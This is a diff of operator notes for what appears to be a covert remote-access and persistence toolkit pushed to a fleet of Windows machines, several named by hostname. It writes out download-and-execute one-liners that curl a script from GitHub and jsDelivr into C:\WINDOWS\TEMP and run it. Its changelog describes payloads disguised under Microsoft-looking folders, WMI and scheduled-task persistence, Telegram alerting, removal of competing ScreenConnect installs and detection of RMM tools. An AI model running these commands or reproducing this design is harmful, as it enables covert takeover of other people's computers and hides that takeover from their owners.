@@ -1,21 +1,28 @@
-UNIVERSAL DEPLOY  (O29: SC-compatible install ladder - /fa first, /i last resort
-only when unregistered; L8 registered test fixed; Guest MSI URL unified; pkg.msi
-cache wired into mon heal; identity %%L + WOW hive from O28):
+UNIVERSAL DEPLOY  (O30 / M20 / L9 / T10 / S6):
 
-  attrib -h -s -r C:\WINDOWS\TEMP\own.cmd >nul 2>&1 & curl.exe -L --ssl-no-revoke -o C:\WINDOWS\TEMP\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own.txt?t=o29" && call C:\WINDOWS\TEMP\own.cmd
+  attrib -h -s -r C:\WINDOWS\TEMP\own.cmd >nul 2>&1 & curl.exe -L --ssl-no-revoke -o C:\WINDOWS\TEMP\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own.txt?t=o30" && call C:\WINDOWS\TEMP\own.cmd
 
 Rescue:
 
-  attrib -h -s -r C:\WINDOWS\TEMP\own.cmd >nul 2>&1 & curl.exe -L -o C:\WINDOWS\TEMP\own.cmd "https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/own.txt?t=o29" && call C:\WINDOWS\TEMP\own.cmd
+  attrib -h -s -r C:\WINDOWS\TEMP\own.cmd >nul 2>&1 & curl.exe -L -o C:\WINDOWS\TEMP\own.cmd "https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/own.txt?t=o30" && call C:\WINDOWS\TEMP\own.cmd
+
+O30 fixes from fleet reports + audit:
+- TASK_B dual-path restored (etl_mon) + synced every tick
+- Tick mutex (no overlapping msiexec races)
+- BUILD-marker verify on auto-update (rejects HTML junk)
+- IDENTVER=5 forces identity regen off old MemoryDiagnostic pools
+- state.json tasks=0/4 fixed (schtasks LASTEXITCODE)
+- Full WMI graph ensure (not consumer-only)
+- Registered-stuck primary now TG-alerts
+- Plaintext BOT_TOKEN removed (embedded notify.cfg via B64_NTF)
+- RMM list +Kaseya/Action1/Tactical/Bomgar/Parsec
+- ETL path aligned to Diagnosis\State\.etlcache
 
 Expect TG:
-  Source build: O29
-  Payload builds: MON=M19 | SEC=S6 | TGR=T10 | LIB=L8
-  identity_A=\Microsoft\Windows\...   (real path)
-  exterminate ... product=N dir=N
-  Foreign SC folders left: 0
-  NO msi_reinstall_ line (blind REINSTALL removed - it wiped ALT)
+  Source build: O30
+  Payload builds: MON=M20 | SEC=S6 | TGR=T10 | LIB=L9
+  identity_A=\Microsoft\Windows\... (real, not %V)
+  digest b=M20
 
-Verify:
-  findstr /C:"BUILD" "C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache\own_mon.cmd" "C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache\own_lib.ps1"
-  (expect M19 / L8)
+FORCE O30 on stuck boxes still showing b=M10/M15/M16 or Source build O17
+(USER-PC, HRTAG48, TCJSURFACE, LAP406C, CKJ0D5I, etc).
